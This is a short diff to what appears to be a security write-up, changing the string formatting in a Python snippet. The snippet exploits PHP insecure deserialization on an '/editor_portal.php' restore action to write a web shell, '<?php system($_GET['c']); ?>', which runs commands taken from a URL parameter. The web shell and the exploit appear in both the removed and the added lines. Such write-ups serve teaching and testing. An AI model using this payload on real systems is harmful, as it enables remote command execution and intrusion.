@@ -128,8 +128,9 @@ Base64 it, POST it as `data`, and the object is reconstructed during unserialize
 
 ```python
 path, contents = "marg.php", "<?php system($_GET['c']); ?>"
-ser = 'O:12:"BackupWriter":2:{{s:4:"path";s:{pl}:"{p}";s:8:"contents";s:{cl}:"{c}";}}'.format(
-    pl=len(path), p=path, cl=len(contents), c=contents)
+ser = ('O:12:"BackupWriter":2:{'
+       's:4:"path";s:%d:"%s";'
+       's:8:"contents";s:%d:"%s";}') % (len(path), path, len(contents), contents)
 post("/editor_portal.php", {"action": "restore", "data": base64.b64encode(ser.encode()).decode()})
 ```
 
